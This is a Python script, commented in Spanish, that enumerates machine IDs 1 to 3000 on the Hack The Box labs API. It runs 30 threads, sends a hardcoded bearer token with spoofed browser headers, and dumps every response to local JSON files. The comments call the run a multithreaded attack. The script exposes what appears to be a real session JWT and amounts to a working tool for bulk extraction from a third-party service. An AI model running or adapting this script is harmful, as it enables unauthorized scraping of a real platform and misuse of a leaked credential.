import requests
import json
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURACIÓN DE OBJETIVOS ---
TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI2IiwianRpIjoiZmFlNmQxOTQwMDAwY2ExYzIzOGYxMzdmNTg5Yjg5OWE1NmQ0OGJlMjhjN2EzMGE1NWU3NDEwYjExNzExY2VhNmVhZTEzZGZhZDI4ZjBhMDYiLCJpYXQiOjE3NjY3ODY1MzguOTg5NzI1LCJuYmYiOjE3NjY3ODY1MzguOTg5NzI3LCJleHAiOjE3NjcwNDU3MzguOTgwMywic3ViIjoiMjcxNjQ0Iiwic2NvcGVzIjpbXX0.lUh90soImZ8HXCD4iOaYGkGldX9RIj0XpKZI5fwufha-X_3E-5WEbpGWZu1MpIfRpyWNP-VfRvo8Ny3YfIBN90q7ow-cAvi0D1wKCmPfpwSNDqiYb23_tajVb9xSVwCuBqeRbbfUJIYdnV-BHfICEJacuKlhShm4P0yQ6CT6m-1GiXbXdRT7h_LNUVigHpMHK62y8dpjrUi4wpPhDfBuYwSjqyWKcPbSdeVG1bKYhq0k6ilMrPEV-rVM-8reopjB5Xso0LnlqsZFUuN-27HKoSJaQC520OodndriqT4vvCMHkv1v0Y_XQTUZEvXojXsPre1-wd1BAUHKjveD-j_DIZ0rV1wHMZhlnex6IyF3idZrlmgqjxIOp_KD3EhPl75vIZqN50tgVtJGAz_YImjeV07ndjBB8-v_cSUc5zKk6TtvMk8dljuEAB3LASX241a8C6cGRDz0x6QWA0FPlUAbWtRn0DkzlMRegBjWJUVYZj9KkCgNgCGzLS43eW0M7CEQaQexEIiXavB6GpOpVxdG1pRwtPm5z7esbs_GLu3V9mbbd5tcy6knrt40s276VFQ-HeqSN2KhIwoSxEJjz2dZ2pEBdaQpeEAM18VQy9VaV2z_iB28SD3xZfNoTAzlvpEl1PuJNN2PQj8mSyMk_IkgZhpHn9TON4QHVmfNaDEzkVk"
OUTPUT_DIR = "htb_changelogs_full"
MAX_THREADS = 30  # Máxima potencia
RANGE_START = 1
RANGE_END = 3000

# Headers exactos proporcionados
HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "es-419,es;q=0.9,es-US;q=0.8",
    "authorization": f"Bearer {TOKEN}",
    "origin": "https://app.hackthebox.com",
    "priority": "u=1, i",
    "referer": "https://app.hackthebox.com/",
    "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
}

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def pwn_endpoint(machine_id):
    url = f"https://labs.hackthebox.com/api/v4/machine/changelog/{machine_id}"
    try:
        response = requests.get(url, headers=HEADERS, timeout=15)
        
        # Intentar obtener el JSON, si falla (ej. error 500 o 404 custom), capturar texto
        try:
            raw_data = response.json()
        except:
            raw_data = response.text

        # Estructura completa del JSON a guardar
        full_json = {
            "machine_id": machine_id,
            "endpoint": url,
            "status_code": response.status_code,
            "headers_response": dict(response.headers),
            "data": raw_data,
            "timestamp": time.time()
        }
        
        file_path = os.path.join(OUTPUT_DIR, f"id_{machine_id}.json")
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(full_json, f, indent=4, ensure_ascii=False)
            
        return machine_id, response.status_code, True
    except Exception as e:
        return machine_id, str(e), False

def main():
    print(f"[*] Lanzando ataque multihilo sobre {RANGE_END} IDs...")
    print(f"[*] Directorio de volcado: {OUTPUT_DIR}")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(pwn_endpoint, i): i for i in range(RANGE_START, RANGE_END + 1)}
        
        for future in as_completed(futures):
            m_id, status, success = future.result()
            
            if success:
                if status == 200:
                    print(f"[+] ID {m_id:4} | STATUS {status} | DATA DUMPED", end="\r")
                else:
                    print(f"[-] ID {m_id:4} | STATUS {status}")
            else:
                print(f"[!] ID {m_id:4} | ERROR: {status}")

if __name__ == "__main__":
    start_time = time.time()
    main()
    duration = time.time() - start_time
    print(f"\n\n[V] Completado en {duration:.2f} segundos.")
    print(f"[V] Revisa la carpeta '{OUTPUT_DIR}' para ver los resultados individuales.")